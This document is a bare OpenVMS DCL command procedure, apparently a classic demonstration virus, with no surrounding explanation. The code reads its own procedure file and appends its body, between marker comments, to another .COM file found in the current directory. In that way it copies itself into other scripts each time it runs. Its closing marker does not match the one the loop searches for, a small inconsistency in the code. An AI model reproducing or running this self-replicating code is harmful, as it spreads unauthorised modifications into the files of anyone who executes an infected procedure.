$!XYZZY
$     OPEN/READ FILE 'F$ENV("PROCEDURE")'
$     OPEN/APPEND ELIF 'F$SEARCH("*.COM")'
$ LBL0:       READ/END=DONE FILE REC
$     IF REC .NES. "$!XYZZY" THEN GOTO LBL0
$ LBL1:       WRITE ELIF REC
$     READ/END=DONE FILE REC
$     IF REC .NES. "$!YZZYZ" THEN GOTO LBL1
$     WRITE ELIF REC
$ DONE:       CLOSE FILE
$     CLOSE ELIF
$!YZZYX
